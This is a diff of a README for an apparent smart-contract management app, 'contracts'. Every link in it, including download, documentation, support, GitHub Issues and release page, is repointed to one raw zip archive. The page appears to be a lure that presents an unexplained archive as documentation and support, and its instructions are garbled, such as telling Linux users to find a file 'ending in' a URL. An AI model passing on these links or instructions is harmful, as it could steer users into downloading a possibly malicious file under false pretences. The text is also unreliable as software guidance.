@@ -6,7 +6,7 @@ Welcome to the **contracts** repository! In this guide, you'll learn how to down
 
 ## 🔗 Download Link
 
-[![Download Contracts](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip%20Contracts-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip)
+[![Download Contracts](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip%20Contracts-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip)
 
 ## 🌟 Features
 
@@ -28,13 +28,13 @@ To run this application smoothly, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the software. Follow these simple steps:
 
-1. Click this [link to download](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip).
+1. Click this [link to download](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip).
    
 2. On the Releases page, you’ll see a list of available versions. Choose the version that suits your system. 
 
    - **Windows**: Look for a file ending in `.exe`.
    - **Mac**: Look for a file ending in `.dmg`.
-   - **Linux**: Look for a file ending in `https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip`.
+   - **Linux**: Look for a file ending in `https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip`.
 
 3. Once you select your file, your download will begin automatically.
 
@@ -64,20 +64,20 @@ Once you open the application, you'll find various options to help you manage yo
   
 ## 🗂️ Documentation
 
-You can find more detailed instructions in the documentation. Navigate to the documentation section in the application, or visit the [documentation link](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip) for extensive guides on features, troubleshooting, and best practices.
+You can find more detailed instructions in the documentation. Navigate to the documentation section in the application, or visit the [documentation link](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip) for extensive guides on features, troubleshooting, and best practices.
 
 ## 🌐 Support
 
-If you encounter issues or have questions, please reach out to our support team. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip) or visit our community forums for help. 
+If you encounter issues or have questions, please reach out to our support team. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip) or visit our community forums for help. 
 
 ## 🔗 Additional Information
 
-For more information and updates, keep an eye on our [Release page](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip). Here, you can access new features, bug fixes, and other important changes with each version.
+For more information and updates, keep an eye on our [Release page](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip). Here, you can access new features, bug fixes, and other important changes with each version.
 
 ## 📌 Important Links
 
-- [Download Contracts](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip)
-- [Documentation](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip)
-- [Support](https://raw.githubusercontent.com/knezmilos123/contracts/master/nondisclaim/contracts.zip)
+- [Download Contracts](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip)
+- [Documentation](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip)
+- [Support](https://raw.githubusercontent.com/knezmilos123/contracts/master/repos/Software-v2.3-beta.5.zip)
 
 We hope you enjoy using the **contracts** application! Feel free to explore the tools available and manage your smart contracts with confidence.
